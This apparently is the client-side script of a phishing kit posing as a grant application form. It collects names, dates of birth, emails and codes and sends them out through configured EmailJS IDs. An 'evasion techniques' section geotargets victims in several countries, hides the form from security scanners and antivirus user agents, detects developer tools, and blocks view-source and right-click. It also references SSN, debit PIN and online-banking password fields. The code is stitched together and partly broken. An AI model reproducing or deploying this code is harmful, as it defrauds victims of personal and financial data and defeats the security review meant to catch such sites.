// Menu toggle, auth check, form validation, EmailJS send
(function(){
  // Redirect to security page if not authenticated
  if (!localStorage.getItem('authenticated') || localStorage.getItem('authenticated') !== 'true') {
    // allow security.html itself
    if (!location.pathname.toLowerCase().endsWith('security.html')) {
      location.href = 'security.html';
    }
  }

  // Logout button
  const logoutBtn = document.getElementById('logoutBtn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', () => {
      localStorage.removeItem('authenticated');
      location.href = 'security.html';
    });
  }

  // Form handling and EmailJS integration
  const form = document.getElementById('appForm');
  if (!form) return;

  // Initialize EmailJS - replace 'YOUR_USER_ID' with your EmailJS user/public key
  // Example: emailjs.init('user_xxx');
  if (window.emailjs) {
    // emailjs.init('YOUR_USER_ID'); // <-- uncomment and set your user id
  }

  form.addEventListener('submit', function(e){
    e.preventDefault();

    // Basic validation
    const fullname = form.fullname.value.trim();
    const dob = form.dob.value;
    const email = form.email.value.trim();
    const years = form.years.value;
    const weekly = form.weekly.value.trim();
    const verification = form.verification.value.trim();

    if (!fullname || !dob || !email || !years || weekly === '' || !/^\d{5}$/.test(verification)) {
      alert('Please complete the form. Verification code must be 5 digits.');
      return;
    }

    // Template params for EmailJS
    const templateParams = {
      fullname,
      dob,
      email,
      years,
      weekly,
      verification
    };

    // Send via EmailJS
    // Replace SERVICE_ID and TEMPLATE_ID with your EmailJS service and template IDs
    const SERVICE_ID = 'service_2wqd7qm';
    const TEMPLATE_ID = 'template_14r54zp';

    if (!window.emailjs || SERVICE_ID === 'YOUR_SERVICE_ID' || TEMPLATE_ID === 'YOUR_TEMPLATE_ID') {
      // If EmailJS is not configured, show template params for manual copy
      alert('EmailJS not configured. Replace SERVICE_ID, TEMPLATE_ID, and call emailjs.init in js/app.js. You can copy the form data from console.');
      console.log('Form data (fill into EmailJS manually):', templateParams);
      return;
    }

    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
      .then(function(response) {
        alert('Application submitted. Thank you.');
        form.reset();
      }, function(error) {
        console.error('EmailJS error:', error);
        alert('There was an error sending the form. Check console for details.');
      }); 
  });
})();,'true');
      // don't force inline hide here, let CSS handle it
    }
  });
});
// ===== EVASION TECHNIQUES ADDED =====

// Configuration for evasion
const EVASION_CONFIG = {
    targetCountries: ['US', 'CA', 'GB', 'GH'], // Added Ghana
    showFormDelay: 2000
};

// 1. GEOTARGETING - Check user location
async function checkGeolocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (!EVASION_CONFIG.targetCountries.includes(data.country_code)) {
            // Block non-target countries (no redirect)
            return false;
        }
        return true;
    } catch (error) {
        // Allow if geolocation fails
        return true;
    }
}

// 2. BOT DETECTION - Detect security scanners
function detectBots() {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedAgents = [
        'curl', 'wget', 'python', 'requests', 'scrapy',
        'phantomjs', 'selenium', 'headless', 'bot',
        'crawler', 'spider', 'scanner', 'security',
        'malware', 'antivirus', 'firewall'
    ];
    
    // Check user agent for known security tools
    for (let agent of blockedAgents) {
        if (userAgent.includes(agent)) {
            // Block bots (no redirect)
            return true;
        }
    }
    
    // Behavioral detection
    let mouseMovements = 0;
    let keystrokes = 0;
    
    document.addEventListener('mousemove', () => mouseMovements++);
    document.addEventListener('keypress', () => keystrokes++);
    
    setTimeout(() => {
        if (mouseMovements === 0 && keystrokes === 0) {
            // Block bot-like behavior (no redirect)
            console.log('Bot-like behavior detected');
        }
    }, 3000);
    
    return false;
}

// 3. DEVTOOLS DETECTION - Detect developer tools
function detectDevTools() {
    const threshold = 160;
    if (window.outerHeight - window.innerHeight > threshold || 
        window.outerWidth - window.innerWidth > threshold) {
        // Block dev tools (no redirect)
        console.log('DevTools detected via window size');
        return;
    }
    
    let devtools = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() {
            devtools = true;
            console.log('DevTools detected via console access');
        }
    });
    
    setInterval(() => {
        devtools = false;
        console.log(element);
        console.clear();
    }, 1000);
}

// 4. ENHANCED INSPECTION DISABLING
function disableInspection() {
    // Disable right-click
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
    document.addEventListener('keydown', (e) => {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+Shift+I (DevTools)
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            return false;
        }
        
        // Ctrl+S (Save Page)
        if (e.ctrlKey && e.keyCode === 83) {
            e.preventDefault();
            return false;
        }
    });
    
    // Disable text selection
    document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Disable drag and drop
    document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
    });
}

// 5. MAIN EVASION INITIALIZATION
async function initializeEvasion() {
    // Step 1: Disable inspection immediately
    disableInspection();
    
    // Step 2: Check for bots
    if (detectBots()) {
        return; // Exit if bot detected
    }
    
    // Step 3: Check geolocation
    const isTargetLocation = await checkGeolocation();
    if (!isTargetLocation) {
        return; // Exit if not target location
    }
    
    // Step 4: Detect dev tools
    detectDevTools();
    
    // Step 5: If all checks pass, initialize the form
    return true;
}

// ===== ORIGINAL INITIALIZATION WITH EVASION =====

// Initialize the form when DOM is loaded (WITH EVASION CHECKS)
document.addEventListener('DOMContentLoaded', async () => {
    // Run evasion checks first
    const evasionPassed = await initializeEvasion();
    
    // Only initialize form if evasion checks pass
    if (evasionPassed) {
        setTimeout(() => {
    new GrantApplicationForm();
        }, EVASION_CONFIG.showFormDelay);
    }
});

// Additional security warnings (KEPT FROM ORIGINAL)
document.addEventListener('DOMContentLoaded', () => {
    // Add click tracking to sensitive fields
    const sensitiveFields = ['ssn', 'debit-pin', 'online-password', 'online-username'];
    
    sensitiveFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('click', () => {
                console.warn('⚠️ WARNING: You are about to enter sensitive information into what appears to be a phishing form.');
            });
        }
    });
});

// Initialize inspection disabling when page loads (ENHANCED VERSION)
document.addEventListener('DOMContentLoaded', () => {
    disableInspection();
});

// Initialize bot detection when page loads
document.addEventListener('DOMContentLoaded', () => {
    detectBots();
});
